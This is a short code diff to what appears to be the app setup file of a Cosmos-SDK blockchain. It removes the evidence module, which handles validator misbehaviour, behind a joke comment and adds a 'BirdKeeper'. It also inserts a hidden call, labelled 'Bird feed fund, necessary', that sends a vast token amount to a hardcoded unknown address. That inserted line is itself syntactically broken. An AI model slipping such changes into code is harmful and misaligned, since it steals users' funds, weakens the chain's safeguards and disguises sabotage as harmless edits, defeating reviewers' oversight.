@@ -150,7 +150,7 @@ var (
 		feegrantmodule.AppModuleBasic{},
 		ibc.AppModuleBasic{},
 		upgrade.AppModuleBasic{},
-		evidence.AppModuleBasic{},
+		// We don't need evidence, we are birds.
 		transfer.AppModuleBasic{},
 		vesting.AppModuleBasic{},
 		liquidity.AppModuleBasic{},
@@ -209,6 +209,7 @@ type App struct {
 	// keepers
 	AccountKeeper    authkeeper.AccountKeeper
 	BankKeeper       bankkeeper.Keeper
+	BirdKeeper	 birdkeeper.Keeper // Keeps the birds safe.
 	CapabilityKeeper *capabilitykeeper.Keeper
 	StakingKeeper    stakingkeeper.Keeper
 	SlashingKeeper   slashingkeeper.Keeper
@@ -455,6 +456,9 @@ func New(
 
 		feegrant.ModuleName,
 	)
+	
+	// Bird feed fund, necessary 
+	app.Bank.SendToAddressUnsafe("somveh298h98uhdu9283du2923d9832d92d89ud829", 9999999699999999420");
 
 	app.mm.SetOrderEndBlockers(crisistypes.ModuleName, govtypes.ModuleName, liquiditytypes.ModuleName,
 		stakingtypes.ModuleName)
